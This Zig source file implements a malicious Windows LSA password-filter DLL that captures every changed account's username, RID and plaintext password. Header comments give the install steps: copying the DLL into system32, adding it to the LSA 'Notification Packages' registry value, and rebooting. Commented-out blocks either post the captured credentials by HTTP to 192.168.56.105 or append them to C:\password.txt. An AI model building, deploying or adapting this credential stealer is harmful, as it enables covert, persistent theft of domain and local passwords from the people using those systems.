// https://blog.carnal0wnage.com/2013/09/stealing-passwords-every-time-they.html
// TODO: more error catching 0-0
//
// 1) Decide on usage
//   If net ==> update IP/Port
//   Else ==> update filename
// 2) upload to C:\windows\system32\name.dll
// 2.5) reg query "hklm\system\currentcontrolset\control\lsa" /v "notification packages"
// 3) reg add "hklm\system\currentcontrolset\control\lsa" /v "notification packages" /d scecli\0name /t reg_multi_sz
// 4) shutdown /t 0 /r

const win32 = @import("win32").everything;
const win32_security = @import("win32").security;
const std = @import("std");
const windows = std.os.windows;

// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const WINAPI = windows.WINAPI;

export fn InitializeChangeNotify() void {}

export fn PasswordFilter(
    _: *win32.UNICODE_STRING, // AccountName
    _: *win32.UNICODE_STRING, // FullName
    _: *win32.UNICODE_STRING, // Password
    _: win32.BOOL, // SetOperation
) win32.BOOL {
    return windows.TRUE;
}

fn writeAll(hFile: win32.HANDLE, buffer: []const u8) !void {
    var written: usize = 0;
    var last_written: u32 = 0;

    while (written < buffer.len) {
        const next_write = @as(u32, @intCast(0xFFFFFFFF & (buffer.len - written)));

        // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile
        if (0 == win32.WriteFile(
            hFile,
            buffer.ptr + written,
            next_write,
            &last_written,
            null,
        )) {
            return error.WriteFileFailed;
        }
        written += last_written;
    }
}

export fn PasswordChangeNotify(
    UserName: *win32.UNICODE_STRING,
    RelativeId: u32,
    NewPassword: *win32.UNICODE_STRING,
) win32.NTSTATUS {
    var ansiUsername: win32.STRING = undefined;
    // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlunicodestringtoansistring
    if (win32.STATUS_SUCCESS != win32.RtlUnicodeStringToAnsiString(
        &ansiUsername,
        UserName,
        windows.TRUE,
    )) {
        return win32.STATUS_SUCCESS;
    }

    var ansiPassword: win32.STRING = undefined;
    // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlunicodestringtoansistring
    if (win32.STATUS_SUCCESS != win32.RtlUnicodeStringToAnsiString(
        &ansiPassword,
        NewPassword,
        windows.TRUE,
    )) {
        return win32.STATUS_SUCCESS;
    }

    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    const usernameRIDPassword = std.fmt.allocPrintSentinel(allocator, "{s}:{d}:{s}\n", .{
        ansiUsername.Buffer.?[0..ansiUsername.Length],
        RelativeId,
        ansiPassword.Buffer.?[0..ansiPassword.Length],
    }, 0) catch return win32.STATUS_SUCCESS;
    defer allocator.free(usernameRIDPassword);

    // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlfreeansistring
    win32.RtlFreeAnsiString(&ansiUsername);
    win32.RtlFreeAnsiString(&ansiPassword);

    // ------------------------------------------------------------ START OUTPUT NET

    // const hInternet = win32.InternetOpenA("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0\x00", @intFromEnum(win32.INTERNET_OPEN_TYPE_DIRECT), null, null, 0);
    // const hSession = win32.InternetConnectA(hInternet, "192.168.56.105\x00", 80, null, null, win32.INTERNET_SERVICE_HTTP, 0, 0);
    // const hReq = win32.HttpOpenRequestA(hSession, "POST\x00", "/\x00", null, null, null, win32.INTERNET_FLAG_PRAGMA_NOCACHE, 0);

    // const username = "tester";
    // _ = win32.InternetSetOptionA(hSession, win32.INTERNET_OPTION_USERNAME, @ptrCast(@constCast(username)), @intCast(username.len));
    // _ = win32.InternetSetOptionA(hSession, win32.INTERNET_OPTION_PASSWORD, @ptrCast(@constCast(usernameRIDPassword)), @intCast(usernameRIDPassword.len));
    // _ = win32.HttpSendRequestA(hReq, null, 0, null, 0);
    // _ = win32.HttpEndRequestA(hReq, null, 0, 0);
    // _ = win32.InternetCloseHandle(hInternet);

    // ------------------------------------------------------------ END OUTPUT NET

    // ------------------------------------------------------------ START OUTPUT FILE

    // // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
    // const outFileH: ?win32.HANDLE = win32.CreateFileA(
    //     "C:\\password.txt",
    //     win32.FILE_GENERIC_WRITE,
    //     win32.FILE_SHARE_READ,
    //     null,
    //     win32.OPEN_ALWAYS,
    //     win32.FILE_ATTRIBUTE_NORMAL,
    //     null,
    // );
    // if (outFileH == null) {
    //     return win32.STATUS_SUCCESS;
    // }

    // // // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
    // defer _ = win32.CloseHandle(
    //     outFileH,
    // );

    // // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfilepointer
    // if (win32.SetFilePointer(
    //     outFileH,
    //     0,
    //     null,
    //     win32.FILE_END,
    // ) == win32.INVALID_SET_FILE_POINTER) {
    //     return win32.STATUS_SUCCESS;
    // }

    // writeAll(outFileH.?, usernameRIDPassword) catch {
    //     return win32.STATUS_SUCCESS;
    // };

    // // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-flushfilebuffers?redirectedfrom=MSDN
    // _ = win32.FlushFileBuffers(outFileH);

    // ------------------------------------------------------------ END OUTPUT FILE

    return win32.STATUS_SUCCESS;
}
